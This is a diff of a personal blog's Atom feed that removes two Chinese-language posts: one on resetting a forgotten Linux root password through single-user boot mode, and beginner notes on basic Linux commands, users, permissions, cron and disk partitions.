     </entry>
     <entry>
@@ -989,1258 +2153,6 @@ NAME=loopback
 </code></pre>
 </li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[# Linux找回root密码]]></title>
-        <id>https://kite-007.github.io/linux-zhao-hui-root-mi-ma/</id>
-        <link href="https://kite-007.github.io/linux-zhao-hui-root-mi-ma/">
-        </link>
-        <updated>2021-03-07T09:56:40.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>使用单用户模式进行修改root的密码</strong></p>
-<ol>
-<li>
-<p>再启动虚拟机时，进入开机界面后按下“e”，进入编辑页面。<br>
-<img src="https://kite-007.github.io/post-images/1615111403186.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>按向下方向键找到如图所示一行，在这一行之后添加init=/bin/sh之后按下Ctrl+X，进入单用户模式。<br>
-<img src="https://kite-007.github.io/post-images/1615112842008.png" alt="" loading="lazy"><br>
-<img src="https://kite-007.github.io/post-images/1615112869941.png" alt="" loading="lazy"></p>
-</li>
-</ol>
-<p>3.之后输入mount -o remount,rw /按下Enter，在输入passwd，之后修改密码，成功之后键入touch /.autorelabel按下Enter，再键入exec /sbin/init按下Enter等待修改成功，如图（这里密码输入了两遍）。<br>
-<img src="https://kite-007.github.io/post-images/1615113030396.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[# Linux（基础篇）]]></title>
-        <id>https://kite-007.github.io/linux-shou-ji-ji-chu-pian/</id>
-        <link href="https://kite-007.github.io/linux-shou-ji-ji-chu-pian/">
-        </link>
-        <updated>2021-03-06T11:41:44.000Z</updated>
-        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">1.  Linux目录结构</a></li>
-<li><a href="#2-linux%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93">2. Linux远程登陆与远程文件传输</a></li>
-<li><a href="#3-vi%E4%B8%8Evim%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8">3. vi与vim的介绍与使用</a></li>
-<li><a href="#4-%E5%85%B3%E6%9C%BA%E9%87%8D%E5%90%AF%E5%91%BD%E4%BB%A4">4. 关机重启命令</a></li>
-<li><a href="#5-%E7%94%A8%E6%88%B7">5. 用户</a></li>
-<li><a href="#6-%E7%94%A8%E6%88%B7%E7%BB%84">6. 用户组</a></li>
-<li><a href="#7-%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB">7. 指定运行级别</a></li>
-<li><a href="#8-%E5%B8%AE%E5%8A%A9%E6%8C%87%E4%BB%A4">8. 帮助指令</a></li>
-<li><a href="#9-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%B1%BB">9. 文件目录类</a></li>
-<li><a href="#10-%E6%97%B6%E9%97%B4%E6%97%A5%E6%9C%9F%E7%B1%BB">10. 时间日期类</a></li>
-<li><a href="#11-%E6%90%9C%E7%B4%A2%E6%9F%A5%E6%89%BE%E7%B1%BB">11. 搜索查找类</a></li>
-<li><a href="#12-%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%B1%BB">12. 压缩和解压类</a></li>
-<li><a href="#13-%E7%BB%84%E7%AE%A1%E7%90%86%E5%92%8C%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">13. 组管理和权限管理</a></li>
-<li><a href="#14-crond%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6">14. crond任务调度</a></li>
-<li><a href="#15-at%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">15. at定时任务</a></li>
-<li><a href="#16-%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA-%E6%8C%82%E8%BD%BD">16. 磁盘分区、挂载</a></li>
-<li><a href="#17-linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE">17. Linux网络配置</a></li>
-<li><a href="#18-%E8%AE%BE%E7%BD%AE%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%92%8Chosts%E6%98%A0%E5%B0%84">18. 设置主机名和hosts映射</a></li>
-<li><a href="#19-%E5%88%9D%E8%AF%86%E8%BF%9B%E7%A8%8B">19. 初识进程</a></li>
-<li><a href="#20-%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86service%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%93%E5%BC%80%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99">20. 服务管理（service）与端口打开关闭（防火墙）</a></li>
-<li><a href="#21-%E5%8A%A8%E6%80%81%E7%9B%91%E6%8E%A7%E8%BF%9B%E7%A8%8B%E4%BA%A4%E4%BA%92%E6%98%BE%E7%A4%BA%E6%89%A7%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B">21. 动态监控进程（交互显示执行的进程）</a></li>
-<li><a href="#22-%E7%9B%91%E6%8E%A7%E7%BD%91%E7%BB%9C%E7%9A%84%E7%8A%B6%E6%80%81%E6%9F%A5%E7%9C%8B%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%9F%A5%E7%9C%8B%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5%E7%9A%84%E7%8A%B6%E6%80%81">22. 监控网络的状态（查看协议使用的端口，查看外部链接的状态）</a></li>
-<li><a href="#23-rpm%E4%B8%8Eyum%E5%91%BD%E4%BB%A4">23. rpm与yum命令</a></li>
-</ul>
-(Linux)</p>
-<h1 id="1-linux目录结构">1.  Linux目录结构</h1>
-<blockquote>
-<p>在Linux的世界里，一切都是文件</p>
-</blockquote>
-<pre><code>/（根）目录\*：根。
-/boot（引导）目录\*：Linux启动的核心文件。
-/swap（缓存）目录\*：与内存大小相同（交换分区）。
-/bin目录：为Binary的缩写，存放着经常使用的命令和指令。
-/sbin目录：s意为Super User的意思，这里存放着系统管理员所使用的系统管理程序。
-/home目录\*：普通用户主目录。
-/root目录\*：系统管理员主目录。
-/lib目录：系统程序运行时需要用到这里的动态链接库，几乎所有的程序都要使用~win下的DLL文件。
-/lost+found（隐藏）目录：一般为空，当非法关机后，这里会存在文件。
-/etc目录\*：存放系统管理所需要的配置文件和目录，像安装了MySQL之后他的配置文件就在这里。
-/usr目录\*：很重要的一个目录，大部分应用程序和文件都在这里~win的program files目录。
-/proc（系统）目录：一个虚拟目录，存放系统内存映射，可以访问来获取系统信息。
-/src（系统）目录：为service的缩写，存放服务启动之后需要提取的数据。
-/sys（系统）目录：该目录安装了Linux2.6内核中新出现的一个文件系统 sysfs=》。
-/tmp目录：存放临时文件。
-/dev目录：把硬件设备用文件的形式存储，~win的设备管理器。
-/media目录\*：Linux识别的一些设备，如U盘，光驱会被挂载到这里。
-/mnt目录：外部临时挂载目录。
-/opt目录：给主机额外安装软件所存放的目录（把要安装的软件放在这里进行解压安装）。
-/usr/local目录\*：给主机额外安装软件所安装的目录，一般是通过编译源码方式安装的程序。
-/var目录\*：存放着不断扩充更新或者经常修改的东西，像各种日志文件。
-/selinux目录：全拼security-enhanced linux，SELinux是一种安全子系统，当启用服务时，该文件可以被看到，他控制程序只能访问特定的文件，有三种工作模式，可以自行设置。
-</code></pre>
-<h1 id="2-linux远程登陆与远程文件传输">2. Linux远程登陆与远程文件传输</h1>
-<p><strong>一般工作时使用远程登陆与远程文件传输，需下载（Xshell与Xftp）.链接：https://www.netsarang.com/en/free-for-home-school/</strong></p>
-<ol>
-<li>Xshell远程登陆
-<ul>
-<li>使用Xshell来远程登陆到Linux，远程登陆使用ssh协议（22端口）。</li>
-<li>ifconfig来查看网络信息，获取IP，并在主机终端进行ping，查看与主机的网络是否ping通。</li>
-<li>在Xshell中新建，输入要链接的Linux网络IP，选择一次性，输入账户密码，连接成功。</li>
-</ul>
-</li>
-<li>Xftp远程文件传输
-<ul>
-<li>与Xshell步骤一致</li>
-<li>左为Windows操作系统，右为Linux操作系统，可以鼠标右键进行相互传输</li>
-<li>处理Xftp中文乱码：菜单栏属性选项卡，选择选项，修改编码。</li>
-</ul>
-</li>
-</ol>
-<h1 id="3-vi与vim的介绍与使用">3. vi与vim的介绍与使用</h1>
-<p><strong>Linux系统会内置vi文本编辑器，而vim则可以视为vi的加强版本，具有程序编程（代码补全，编译和错误跳转等）的能力，可以用字体颜色辨别代码语法的正确性。</strong></p>
-<ol>
-<li>vi与vim介绍
-<ul>
-<li>vi与vim有三种模式：正常模式，插入模式和命令行模式
-<ul>
-<li>正常模式（默认）:wq保存退出。</li>
-<li>插入模式，按下i, o, a, r等字母进入，按下Esc建会退出该模式进入到正常模式。</li>
-<li>命令行模式（低端），正常模式按下Shift与‘：’号进入，:w表示写入，:q表示保存，这之后加‘！’号表示强制的意思，与权限有关。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>vi与vim快捷键（常用）
-<ul>
-<li>yy：拷贝光标当前行，nyy则是拷贝当前光标所在的n行。</li>
-<li>dd：删除光标当前行，ndd则是删除当前光标所在的n行。</li>
-<li>查找关键字：在命令行的模式下输入（/关键字）回车进行查找，按键n表示下一个。</li>
-<li>设置文件行号：在命令行模式下输入set nu，取消文件行号则是set nonu。</li>
-<li>移动光标：G为移动到最后一行，gg为移动到第一行，ngg则为移动到第n行。</li>
-<li>撤销一次动作（从正常模式来到插入模式后返回到正常模式）：u按键</li>
-</ul>
-</li>
-</ol>
-<h1 id="4-关机重启命令">4. 关机重启命令</h1>
-<ul>
-<li>基本介绍：
-<ul>
-<li>shutdown -h now ;         立刻进行关机</li>
-<li>shutdown -h 1 ;               1分钟之后关机，会给客户机发送提示信息</li>
-<li>shutdown -r now ;         立刻进行重启</li>
-<li>halt ;                                关机</li>
-<li>reboot ;                            重启</li>
-<li>sync ;                               把内存的数据同步到磁盘</li>
-</ul>
-</li>
-<li>细节：
-<ul>
-<li>无论是重启或是关闭系统，首先都要运行sync命令，将内存中的数据写入到磁盘。</li>
-<li>目前在运行shutdown/halt/reboot等命令均以在关机前进行了sync。</li>
-</ul>
-</li>
-</ul>
-<h1 id="5-用户">5. 用户</h1>
-<ol>
-<li>切换用户：
-<ul>
-<li>登录之后使用：su - 用户名，来更换用户，在多级用户下使用logout进行注销当前用户，1级无效。</li>
-</ul>
-</li>
-<li>添加用户：
-<ul>
-<li>root权限下使用useradd 用户名，来添加用户，默认该用户目录在/home目录下。</li>
-<li>也可以使用useradd -d 指定目录 用户名，来给创建的用户指定目录。</li>
-<li>pwd，显示当前用户所在的目录</li>
-</ul>
-</li>
-<li>设置密码：
-<ul>
-<li>passwd 用户名，来给用户设置密码，如果不加用户，则是给当前用户设置。</li>
-</ul>
-</li>
-<li>删除用户：
-<ul>
-<li>userdel 用户名，保存该用户的家目录（该用户名的目录不是home）。</li>
-<li>userdel -r 用户名，不保存该用户的家目录。</li>
-</ul>
-</li>
-<li>查询用户：
-<ul>
-<li>id 用户名，查询该用户所在的组。</li>
-<li>whoami/who am i，查询当前所登录的用户。</li>
-</ul>
-</li>
-</ol>
-<h1 id="6-用户组">6. 用户组</h1>
-<p><strong>划分组可以使系统对多个用户进行统一的管理</strong></p>
-<ol>
-<li>新增组：
-<ul>
-<li>groupadd 组名，</li>
-</ul>
-</li>
-<li>删除组：
-<ul>
-<li>groupdel 组名，</li>
-</ul>
-</li>
-<li>增加用户时直接加上组：
-<ul>
-<li>useradd -g 用户组 用户名，如果创建用户不加组，系统会默认生成一个与用户名相同的组，并将该用户放在此组里面。</li>
-</ul>
-</li>
-<li>修改用户的组：
-<ul>
-<li>usermod -g 用户组 用户名，</li>
-<li>usermod -d 目录名 用户名 ： 改变用户登陆的初始目录，用户需要有进入该目录的权限</li>
-</ul>
-</li>
-<li>用户和组相关的文件：
-<ul>
-<li>/etc/passwd：用户的配置文件，记录用户的各种信息。</li>
-<li>每行的含义：（用户名：口令：用户标识号（uid）：组标识号（gid）：注释性描述：主目录：登录Shell）</li>
-<li>/etc/shadow：口令的配置文件</li>
-<li>每行的含义：（登录名：加密口令：最后一次修改的时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志）</li>
-<li>/etc/group：组的配置文件，记录Linux下用户所包含的组信息</li>
-<li>每行的含义：（组名：口令：组标识号：组内用户列表）</li>
-</ul>
-</li>
-</ol>
-<h1 id="7-指定运行级别">7. 指定运行级别</h1>
-<p><strong>CentOS7在/etc/inittab文件中有修改默认级别说明</strong></p>
-<p>运行级别说明</p>
-<ul>
-<li>0：关机</li>
-<li>1：单用户【找回丢失密码】</li>
-<li>2：多用户状态没有网络服务</li>
-<li>3：多用户状态有网络服务</li>
-<li>4：系统未使用保留给用户</li>
-<li>5：图形界面</li>
-<li>6：系统重启</li>
-<li>常用的运行级别为3和5，也可以指定默认运行级别</li>
-<li>init X , X:0.1.2.3.4.5.6,切换不同的运行级别</li>
-</ul>
-<h1 id="8-帮助指令">8. 帮助指令</h1>
-<ol>
-<li>man：获得帮助信息
-<ul>
-<li>man [命令或配置文件]：例如获取ls命令的帮助信息</li>
-</ul>
-</li>
-<li>help：
-<ul>
-<li>help [命令]：获得Shell内置命令的帮助信息</li>
-</ul>
-</li>
-</ol>
-<h1 id="9-文件目录类">9. 文件目录类</h1>
-<ol>
-<li>pwd指令：显示当前工作目录的绝对路径。</li>
-<li>ls指令：ls [-选项]，列出目录。
-<ul>
-<li>-a：显示所有的文件和目录，包括隐藏的。</li>
-<li>-l：以列表的形式显示信息（用户权限等）。</li>
-<li>-h：文件大小显示，带单位。(要搭配-l使用)</li>
-<li>-R：递归查询子目录</li>
-</ul>
-</li>
-<li>cd指令：cd [参数]，切换到指定目录。
-<ul>
-<li>(cd ~)或者(cd 😃：回到自己的家目录。</li>
-<li>(cd ..)：回到当前所在目录的上一级目录。</li>
-</ul>
-</li>
-<li>mkdir指令：mkdir [-选项] [要创建的目录]。
-<ul>
-<li>-p：创建多级目录。</li>
-</ul>
-</li>
-<li>rmdir指令：rmdir [-选项] [要删除的空目录]。
-<ul>
-<li>这个指令删除的是空目录，如果目录下有内容则无法删除。</li>
-<li>如果要删除非空的目录，则需要使用 rm -rf [要删除的目录]，小心使用。</li>
-</ul>
-</li>
-<li>touch指令：touch [文件名称]，创建一个空文件。</li>
-<li>拷贝文件指令：cp [-选项] [哪个文件] [到哪里]。
-<ul>
-<li>-r：递归复制整个文件夹，如果存在相同的文件，不想出现提示信息，可以在cp前加\，\cp -r source dest。</li>
-</ul>
-</li>
-<li>移除文件或目录指令：rm [-选项] [要删除的文件或目录]。
-<ul>
-<li>-r：递归删除整个文件夹。</li>
-<li>-f：强制删除不提示。</li>
-</ul>
-</li>
-<li>移动文件或目录，给文件重新命名：mv
-<ul>
-<li>mv [1] [2]，如果1与2在同一个目录，则1的名字会被重命名为2，反之，如果不在同一个目录，则1会被移动到2目录，可以移动整个目录。</li>
-</ul>
-</li>
-<li>查看文件内容：cat [-选项] [文件]
-<ul>
-<li>cat 与 vim的区别，cat只能浏览文件，不能修改文件，比较安全。</li>
-<li>-n：显示行号</li>
-<li>为了浏览方便，一般会带上（管道命令 | more）（cat [-选项] [文件] | more）</li>
-<li>管道命令：前面的结果交给下一个指令处理</li>
-</ul>
-</li>
-<li>more指令：more [要查看的文件]
-<ul>
-<li>这是一个基于VI编辑器的文本过滤器，以全屏的方式按页显示文本文件的内容。</li>
-<li>more设置了若干个快捷键：
-<ul>
-<li>空白键：向下翻一页</li>
-<li>Enter：向下翻一行</li>
-<li>q：离开more模式，不再显示文件的内容</li>
-<li>Ctrl+F：向下滚动一屏</li>
-<li>Ctrl+B：返回上一屏</li>
-<li>=：输出当前的行号</li>
-<li>（:f）：输出文件名和当前的行号</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>less指令：less [要查看的文件]
-<ul>
-<li>与more的功能类似，但是更加强大。</li>
-<li>分屏查看文件的内容，他并不是将整个文件加载后显示，而是根据显示需要加载的内容，对于大型文件具有较高的效率</li>
-<li>less快捷键：
-<ul>
-<li>空白键：向下翻动一页</li>
-<li>pagedown：向下翻动一页</li>
-<li>pageup：向上翻动一页</li>
-<li>/字符串：向下搜寻字符串的功能；n:向下查看，N:向上查看</li>
-<li>?字符串：向上搜寻字符串的功能；n:向上查看，N:向下查看</li>
-<li>q：离开less模式，不再显示文件的内容</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>echo指令：echo [-选项] [输出内容] &gt; [目录]
-<ul>
-<li>输出内容到控制台，输出内容重定向到该目录</li>
-</ul>
-</li>
-<li>head指令：显示文件的开头的内容，默认情况下显示前10行的内容。
-<ul>
-<li>head [文件] ：查看文件的前10行的内容</li>
-<li>head -n 5 [文件] ：查看文件的前5行的内容（5可以为任意数）</li>
-</ul>
-</li>
-<li>tail指令：显示文件的尾部的内容，默认情况下显示后10行的内容。
-<ul>
-<li>tail [文件] ：查看文件的后10行的内容</li>
-<li>tail -n 5 [文件] ：查看文件的后5行的内容（5可以为任意数）</li>
-<li>tail -f [文件] ：实时监控文件更新的内容</li>
-</ul>
-</li>
-<li>
-<blockquote>
-<p>指令与&gt;&gt;指令：&gt;输出重定向和&gt;&gt;追加</p>
-</blockquote>
-<ul>
-<li>ls -l &gt;文件：列表的内容写入到文件中（覆盖）</li>
-<li>ls -al &gt;&gt;文件：列表的内容追加到文件中（末尾）</li>
-<li>cat 文件1 &gt; 文件2：将文件1的内容覆盖到文件2</li>
-<li>echo “内容”&gt; 文件：（覆盖）</li>
-<li>echo “内容”&gt;&gt; 文件：（追加）</li>
-</ul>
-</li>
-<li>ln指令：软链接也成为符号链接，类似与win里的快捷方式，主要存放了链接其他文件的路径
-<ul>
-<li>ln -s [原文件或目录] [软链接名]：给原文件创建一个软链接</li>
-<li>pwd指令查看文件目录时，显示的是软连接所在的目录</li>
-</ul>
-</li>
-<li>history：显示历史命令
-<ul>
-<li>history n ：显示最近使用过的n个指令</li>
-<li>!5：重新执行最近使用过的第5个指令</li>
-</ul>
-</li>
-</ol>
-<h1 id="10-时间日期类">10. 时间日期类</h1>
-<ol>
-<li>date指令：显示当前的日期
-<ul>
-<li>date：显示当前的时间</li>
-<li>date +%Y：显示当前的年份</li>
-<li>date +%m：显示当前的月份</li>
-<li>date +%d：显示当前是哪一天</li>
-<li>date &quot;+%Y-%m-%d %H:%M:%S&quot;：显示年月日时分秒</li>
-</ul>
-</li>
-<li>用date设置时间：date -s &quot;2021-3-7 21:50:21&quot;</li>
-<li>cal：查看日历
-<ul>
-<li>cal [-选项]：不加选项显示的是本月的日历 eg:cal 2020</li>
-</ul>
-</li>
-</ol>
-<h1 id="11-搜索查找类">11. 搜索查找类</h1>
-<ol>
-<li>find指令
-<ul>
-<li>从指定目录向下递归遍历各个子目录，将满足条件的显示在终端。</li>
-<li>find [搜索范围] [选项]</li>
-<li>-name &lt;查询方式&gt; 按照指定的文件名查找模式查找文件。</li>
-<li>-user &lt;用户名&gt; 查找属于指定用户名所有文件。</li>
-<li>-size &lt;文件大小&gt; 按照指定的文件大小查找文件（+n大于，-n小于，n等于，单位：K,M,G）。</li>
-</ul>
-</li>
-<li>locate指令
-<ul>
-<li>可以快速定位文件的路径，通过建立数据库的方式实现快速查找文件路径的目的。</li>
-<li>首次执行时，需要执行updatedb指令来创建locate数据库。</li>
-<li>locate [文件]</li>
-</ul>
-</li>
-<li>which指令
-<ul>
-<li>可以查看某个指令的位置</li>
-<li>which [ls]</li>
-</ul>
-</li>
-<li>grep指令和管道符号 |
-<ul>
-<li>grep 表示过滤查找</li>
-<li>“|”，表示将前一个命令的处理结果输出传递给后面的命令处理。</li>
-<li>grep [选项] [查找内容] [源文件]</li>
-<li>-n 显示匹配行及符号</li>
-<li>-i 忽略字母大小写</li>
-<li>写法：
-<ul>
-<li>eg:cat /home/hello.txt | grep -n &quot;yes&quot;,查找hello.txt文件中的yes,显示行号。</li>
-<li>eg:grep -n &quot;yes&quot; /home/hello.txt,与上述效果相同。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<h1 id="12-压缩和解压类">12. 压缩和解压类</h1>
-<ol>
-<li>gzip/gunzip指令：gzip为压缩命令，gunzip为解压命令
-<ul>
-<li>gzip [文件]，只能将文件压缩为.gz文件。</li>
-<li>gunzip [文件].gz，解压缩文件命令。</li>
-</ul>
-</li>
-<li>zip/unzip指令：zip用于压缩文件，unzip用于解压文件
-<ul>
-<li>zip [-选项] [压缩为XXX.zip] [要压缩的文件，包括本文件]</li>
-<li>-r：递归压缩，压缩目录</li>
-<li>unzip [-选项] [解压到此目录] [目录/XXX.zip]</li>
-<li>-d&lt;目录&gt;：指定解压文件解压后形成的文件的存放目录。</li>
-</ul>
-</li>
-<li>tar指令：将文件打包为.tar.gz
-<ul>
-<li>tar [-选项] [XXX.tar.gz] [要打包的内容，可用空格隔开]</li>
-<li>tar [-选项] [要解压的文件.tar.gz] -C [要解压到的目录]</li>
-<li>-c：产生.tar打包文件</li>
-<li>-v：显示详情信息</li>
-<li>-f：指定压缩后的文件名</li>
-<li>-z：打包同时压缩</li>
-<li>-x：解包.tar文件</li>
-</ul>
-</li>
-</ol>
-<h1 id="13-组管理和权限管理">13. 组管理和权限管理</h1>
-<p><strong>组的基本介绍：Linux中，每个用户都必须存在一个组内，不能独立与组外。在Linux中每个文件有所有者，所在组，其他组的概念</strong><br>
-<em>1. 所有者</em><br>
-<em>2. 所在组</em><br>
-<em>3. 其他组</em><br>
-* =除文件的所有者和所在组的用户外，系统的其他用户都是文件的其他组=<br>
-<em>4. 改变用户所在的组</em></p>
-<ol>
-<li>文件/目录 所有者<br>
-<strong>文件的所有者一般是该文件的创造者</strong>
-<ul>
-<li>修改文件的所有者：
-<ul>
-<li>查看文件的所有者：ls -ahl</li>
-<li>修改所有者：
-<ul>
-<li>chown [-选项] [用户名] [文件名]</li>
-</ul>
-</li>
-<li>修改所有者和所在组
-<ul>
-<li>chown [-选项] [用户名]:[所在组] [文件名]</li>
-</ul>
-</li>
-<li>修改文件所在的组：
-<ul>
-<li>chgrp [-选项] [组名] [文件名]</li>
-</ul>
-</li>
-<li>-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<p><strong>权限的基本介绍：</strong><br>
-<em>使用ll命令查看：</em><br>
-<em>-rwxrwxrwx. 1 root root    314 3月   7 11:04 1.txt</em><br>
-<em>权限说明 | 文件：硬链接数 或 目录：子目录数 | 用户 | 组 | 文件大小(字节) | 最后修改日期 | 文件名</em><br>
-<em>看上述命令结果，-rwxrwxrwx. 这里一共10个位置</em><br>
-<em>rwx可以用数字表示，r代表4，w代表2，x代表1，rwx=4+2+1=7</em></p>
-<pre><code>    * 0~9位说明：
-       * 0位：确定文件的类型。
-            * （l:软连接,相当于win里的快捷方式，d:表示目录,相当于win里的文件夹，c:字符设备文件,像鼠标键盘等，b:块设备,像硬盘，-:一般文件）。
-        * 1~3：确定所有者拥有该文件的权限。rwx
-        * 4~6：确定所属组拥有该文件的权限。rwx
-        * 7~9：确定其他组拥有该文件的权限。rwx
-            * （r:表示可读，w:表示可写，x:表示可执行）。
-                * rwx作用到文件
-                    * r:可以读取查看
-                    * w:可以修改，不代表可以删除该文件，删除一个文件的前提条件是对该文件所在的目录有写权限 ，才能删除该文件。
-                    * x:代表可以被执行
-                * rwx作用到目录
-                    * r:可以读取，ls查看内容
-                    * w:可以修改，对目录内创建+删除+重命名目录
-                    * x:可以进入该目录
-</code></pre>
-<ol start="2">
-<li>修改文件权限 chmod命令,chmod [权限] [文件]
-<ol>
-<li>+、-、=号修改权限
-<ul>
-<li>u:所有者，g:所有组，o:其他人，a:所有人(u、g、o的综合)</li>
-<li>chmod u=rwx,g=rx,o=x [文件/目录名]</li>
-<li>chmod o+w [文件/目录名]</li>
-<li>chmod a-x [文件/目录名]</li>
-</ul>
-</li>
-<li>通过数字变更权限
-<ul>
-<li>chmod 777 [文件/目录名]</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="14-crond任务调度">14. crond任务调度</h1>
-<p><strong>任务调度：是指系统在某个时间执行的特定的命令或程序</strong><br>
-<em>任务调度分类：</em><br>
-1. 系统工作：有些重要的工作必须周而复始地执行。如病毒扫描等。<br>
-2. 个别用户工作：个别用户可能希望自行某些程序，比如对MySQL的数据备份。</p>
-<ul>
-<li>基本语法：crontab [-选项]
-<ul>
-<li>-e:编辑crontab定时任务</li>
-<li>-l:查询crontab任务</li>
-<li>-r:删除当前用户所有的crontab任务</li>
-<li>service cront restart:重启任务调度
-<ul>
-<li>crond任务调度入门：
-<ul>
-<li>设置任务调度文件：/etc/crontab</li>
-<li>设置个人任务调度。执行crontab -e命令</li>
-<li>接着输入任务到调度文件</li>
-<li>如：*/1 * * * * ls -l /etc/ &gt; /tmp/to.txt</li>
-<li>意思是每小时的每分钟执行 ls -l /etc/ &gt; /tmp/to.txt命令
-<ul>
-<li>*/1 * * * *中五个占位符说明：
-<ol>
-<li>一小时中的第几分钟（0~59）</li>
-<li>一天当中的第几小时（0~23）</li>
-<li>一个月当中的第几天（1~31）</li>
-<li>一年当中的第几个月（1~12）</li>
-<li>一周当中的星期几（0~7）</li>
-</ol>
-</li>
-<li>特殊符号的说明
-<ol>
-<li>* ：代表任何时间。比如上述的第一个“*”，就代表一小时中每分钟都执行一次的意思。</li>
-<li>,：代表不连续的时间。比如“0 8,12,16 * * *”，就代表在每天的8点0分，12点0分，16点0分都执行一次命令。</li>
-<li>-：代表持续的时间范围。比如“0 5 * * 1-6”，代表周一到周六的凌晨5点0分执行命令。</li>
-<li>*/n：代表每隔多久执行一次。比如“*/10  * * * *”，代表每隔10分钟就执行一次命令</li>
-</ol>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="15-at定时任务">15. at定时任务</h1>
-<p><em>基本介绍：</em><br>
-1. at命令是一次性定时计划任务，at的守护进程atd会以后台模式运行，检查作业队列来运行。<br>
-2. 默认情况下，atd守护进程每60秒检查作业队列，有作业时，会检查作业的运行时间，如果时间与当前时间匹配，则运行次作业。<br>
-3. at命令是一次性定时计划任务，执行完一个任务后不再执行此任务了。<br>
-4. 在使用at命令时，一定要保证atd进程的启动，可以使用相关指令来查看。<br>
-5. ps -ef,查看运行中的进程。<br>
-6. atq,可以查看系统中没有执行的工作任务<br>
-7. atrm [编号],删除队列中未执行的任务</p>
-<ul>
-<li>基本语法：at [选项] [时间]，回车后输入要执行的命令，之后按Ctrl+D 结束at命令的输入</li>
-<li>at命令选项:
-<ul>
-<li>-m ：当指定的任务被完成后，将给用户发送邮件，即使没有标准输出</li>
-<li>-I(大写i) ：atq的别名</li>
-<li>-d ：atrm的别名</li>
-<li>-v： 显示任务将被执行的时间</li>
-<li>-c： 打印任务的内容到标准输出</li>
-<li>-V：显示版本信息</li>
-<li>-q &lt;队列&gt;：使用指定的队列</li>
-<li>-f&lt;文件&gt;：从指定文件读入任务而不是从标准输入读入</li>
-<li>-t&lt;时间参数&gt;：以时间参数的形式提交要运行的任务</li>
-</ul>
-</li>
-<li>at指定时间的方法：
-<ol>
-<li>接受在当天的hh:mm(小时：分钟)式的时间指定。假如该时间已过去，那么就放在第二天执行。例如：04:00（如果已经过了当天的四点，那麽此进程就会放在第二天执行）。</li>
-<li>使用midnight(深夜)，noon(中午)，teatime(饮茶时间，一般是下午4点)等比较模糊的词语来指定时间。</li>
-<li>采用12小时计时制，即在时间后面加上AM(上午)或PM(下午)来说明是上午还是下午。例如：12pm。</li>
-<li>指定命令执行的具体日期，指定格式为month day(月日)或mm/dd/yy(月/日/年)或dd.mm.yy(日.月.年)，指定的日期必须跟在指定时间的后面。例如：04:00 2021-03-1。</li>
-<li>使用相对计时法。指定格式为：now + count time-units，now就是当前时间，time-units是时间单位，这里能够是minutes(分钟)、hours(小时)、days(天)、weeks(星期)。count是时间的数量，几天，几小时。例如：now + 5 minutes.</li>
-<li>直接使用today(今天)、tomorrow(明天)来指定完成命令的时间。</li>
-</ol>
-</li>
-</ul>
-<h1 id="16-磁盘分区-挂载">16. 磁盘分区、挂载</h1>
-<p><strong>Linux分区：</strong></p>
-<ul>
-<li>
-<p>原理介绍</p>
-<ol>
-<li>Linux来说无论有几个分区，分给哪一目录使用，它归根结底就只有一个根目录，一个独立且唯一的文件结构，Linux中每个分区都是用来组成整个文件系统的一部分。</li>
-<li>Linux采用了一种叫“载入”的处理方法，它的整个文件系统中包含了一整套的文件和目录，且将一个分区和一个目录联系起来。这时要载入的一个分区将使它的存储空间在一个目录下获得。</li>
-<li>示意图：<img src="https://kite-007.github.io/post-images/1615211272581.png" alt="" loading="lazy"></li>
-<li>lsblk或lsblk -f命令可以查看磁盘分区挂载情况。</li>
-</ol>
-</li>
-<li>
-<p>硬盘说明</p>
-<ol>
-<li>Linux硬盘分IDE硬盘和SCSI硬盘，目前基本上是SCSI硬盘</li>
-<li>对于IDE硬盘，驱动器标识符为“hdx<sub>”，其中“hd”表明分区所在设备的类型，这里是指IDE硬盘了。“x”为盘号（a为基本盘，b为基本从属盘，c为辅助主盘，d为辅助从属盘），“</sub>”代表分区，前四个分区用数字1到4表示，它们是主分区或扩展分区，从5开始就是逻辑分区。例，hda3表示为第一个IDE硬盘上的第三个主分区或扩展分区，hdb2表示为第二个IDE硬盘上的第二个主分区或扩展分区。</li>
-<li>对于SCSI硬盘则标识为“sdx~”，SCSI硬盘是用“sd”来表示分区所在设备的类型的，其余则和IDE硬盘的表示方法一样。</li>
